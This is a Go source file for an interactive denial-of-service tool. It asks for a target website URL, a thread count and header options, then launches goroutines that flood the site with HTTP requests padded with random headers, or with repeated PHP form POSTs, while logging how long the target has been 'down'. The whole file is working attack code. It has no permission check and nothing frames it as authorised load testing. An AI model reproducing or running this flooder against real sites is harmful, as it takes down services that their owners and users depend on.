package main

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

func main() {

	var FloodMethod string = "HTTP"

	var URL string
	var Method string
	var Threads int
	var HPR int
	var HeaderSizeChar int

	var CustomHeaders string = "N"
	var SHOWONLYDOWN string = "N"
	var SHOWOUTPUT string = "N"
	var confirmed string = "Y"

	var DoNextCustomHeader string = "N"
	var CustomHeaderName string
	var CustomHeaderBody string

	var HeadersName []string
	var HeadersCont []string

	fmt.Println("=============================================================")
	fmt.Println(" due to golang fmt.scanln please don't make spaces in input!")
	fmt.Println("=============================================================")

	fmt.Print("Flood method [php/HTTP] - ")
	fmt.Scanln(&FloodMethod)

	if strings.ToLower(FloodMethod) == "http" {
		fmt.Print("Website URL <STRING> - ")
		fmt.Scanln(&URL)
		fmt.Print("HTTP Method <STRING> - ")
		fmt.Scanln(&Method)
		fmt.Print("Headers per request <INT> - ")
		fmt.Scanln(&HPR)
		fmt.Print("Header size (random ascii char) <INT> - ")
		fmt.Scanln(&HeaderSizeChar)
		fmt.Printf("Custom headers [y/N] -> ")
		fmt.Scanln(&CustomHeaders)

		if strings.ToLower(CustomHeaders) == "y" {
			fmt.Print("\n")
			for {
				fmt.Print("Header name <STRING> - ")
				fmt.Scanln(&CustomHeaderName)
				fmt.Print("Header content <STRING> - ")
				fmt.Scanln(&CustomHeaderBody)

				HeadersName = append(HeadersName, CustomHeaderName)
				HeadersCont = append(HeadersCont, CustomHeaderBody)
				fmt.Print("Do you want to add next header? [y/N] -> ")
				DoNextCustomHeader = "N"
				fmt.Scanln(&DoNextCustomHeader)

				if strings.ToLower(DoNextCustomHeader) == "n" {
					break
				} else {
					fmt.Print("\n")
				}
			}

		}
	} else if strings.ToLower(FloodMethod) == "php" {
		fmt.Print("Website URL <STRING> (link to php) - ")
		fmt.Scanln(&URL)
		fmt.Print("php form name <STRING> - ")
		fmt.Scanln(&CustomHeaderName)
		fmt.Print("php form content <STRING> - ")
		fmt.Scanln(&CustomHeaderBody)

		HeadersName = append(HeadersName, CustomHeaderName)
		HeadersCont = append(HeadersCont, CustomHeaderBody)

		fmt.Print("do you want do add another php value? [y/N] -> ")
		fmt.Scanln(&DoNextCustomHeader)

		for strings.ToLower(DoNextCustomHeader) == "y" {
			DoNextCustomHeader = "N"
			fmt.Print("\n\nphp form header <STRING> - ")
			fmt.Scanln(&CustomHeaderName)
			fmt.Print("\nphp form content <STRING> - ")
			fmt.Scanln(&CustomHeaderBody)

			HeadersName = append(HeadersName, CustomHeaderName)
			HeadersCont = append(HeadersCont, CustomHeaderBody)

			fmt.Print("\ndo you want do add another php value? [y/N] ->")
			fmt.Scanln(&DoNextCustomHeader)
		}

	} else {
		os.Exit(1)
	}

	fmt.Print("Threads <INT> - ")
	fmt.Scanln(&Threads)
	fmt.Print("Show Only DownInfo? [y/N] -> ")
	fmt.Scanln(&SHOWONLYDOWN)
	fmt.Print("Show website output? [y/N] ->")
	fmt.Scanln(&SHOWOUTPUT)

	fmt.Print("\n\n\n=============================================================\n")
	fmt.Println("Flood method     = " + FloodMethod)

	if strings.ToLower(FloodMethod) == "http" {
		fmt.Println("URL              = " + URL)
		fmt.Println("method           = " + Method)
		fmt.Printf("Threads          = %d \n", Threads)
		fmt.Printf("HPR              = %d \n", HPR)
		fmt.Printf("Header size      = %d \n\n", +HeaderSizeChar)
		fmt.Println("Log only down     = " + SHOWONLYDOWN)
	} else if strings.ToLower(FloodMethod) == "php" {
		fmt.Println("PHP URL          = " + URL)
		fmt.Printf("Threads          = %d \n", Threads)
		fmt.Println("Log only down    = " + SHOWONLYDOWN)
	}
	fmt.Print("============================================================= \n")
	fmt.Printf("confirm [Y/n] -> ")
	fmt.Scanln(&confirmed)
	var i int

	if strings.ToLower(confirmed) == "y" {
		if strings.ToLower(FloodMethod) == "http" {
			for i = 0; i < Threads; i++ {
				go HTTP_FLOOD(URL, Method, HeaderSizeChar, HPR, SHOWONLYDOWN, HeadersName, HeadersCont, SHOWOUTPUT)
			}
		} else if strings.ToLower(FloodMethod) == "php" {
			for i = 0; i < Threads; i++ {
				go PHP_FLOOD(URL, SHOWONLYDOWN, HeadersName, HeadersCont, SHOWOUTPUT)
			}
		}

	} else {
		os.Exit(0)
	}

	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	var StartedAt = time.Now()
	for {
		<-c

		fmt.Print("\n\n\n=============================================================\n")

		fmt.Println("Runtime                  - ", time.Now().Sub(StartedAt))
		fmt.Println("Done rCode:200 requests  - ", FinishDone200)
		fmt.Println("Dome rCode!200 requests  - ", FinishNot200)
		fmt.Println("request summary          - ", FinishDone200+FinishNot200)

		fmt.Print("=============================================================\n")

		os.Exit(0)
	}
}

func RandStringRunes(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var LastRespond time.Time

func NotResponded(URL string) {
	duration := time.Now().Sub(LastRespond)
	log.Printf("[ " + URL + " ] - is down from " + string(duration.String()) + "\n")
}

func HTTP_FLOOD(URL string, Method string, HeaderSize int, HPR int, OnlyDown string, CustomHeaderName []string, CustomHeaderBody []string, ShowOutput string) {

	req, err := http.NewRequest(Method, URL, nil)

	if err != nil {
		fmt.Println(err.Error())
	}

	for i := 0; i < len(CustomHeaderName); i++ {
		req.Header.Set(CustomHeaderName[i], CustomHeaderBody[i])
	}

	var i int
	for i = 0; i < HPR; i++ {
		req.Header.Add(RandStringRunes(HeaderSize), RandStringRunes(HeaderSize))
	}

	for {
		if FinishRoutine {
			break
		}

		client := &http.Client{}
		resp, err := client.Do(req)

		if err != nil {
			NotResponded(URL)
		} else {
			if resp.StatusCode == 200 {
				FinishDone200++
				if strings.ToLower(OnlyDown) == "n" {
					if strings.ToLower(ShowOutput) == "y" {

						info, err := io.ReadAll(resp.Body)
						if err == nil {
							log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200, " | ", string(info))
						}
					} else {
						log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
					}
				}
			} else {
				FinishNot200++
				log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
			}
			LastRespond = time.Now()
		}
	}
}

func PHP_FLOOD(URL string, OnlyDown string, PHPnames []string, PHPbodies []string, ShowOutput string) {

	Values := url.Values{}

	for i := 0; i < len(PHPnames); i++ {
		Values.Set(PHPnames[i], PHPbodies[i])
	}

	for {
		if FinishRoutine {
			break
		}
		resp, err := http.PostForm(URL, Values)

		if err != nil {
			NotResponded(URL)
		} else {
			if err == nil {
				if resp.StatusCode == 200 {
					FinishDone200++
					if strings.ToLower(OnlyDown) == "n" {
						if strings.ToLower(ShowOutput) == "y" {

							info, err := io.ReadAll(resp.Body)
							if err == nil {
								log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200, " | ", string(info))
							}
						} else {
							log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
						}
					}
				} else {
					FinishNot200++
					log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
				}
				LastRespond = time.Now()
			}
		}
	}
}

var FinishDone200 int64 = 0
var FinishNot200 int64 = 0

var FinishRoutine bool = false
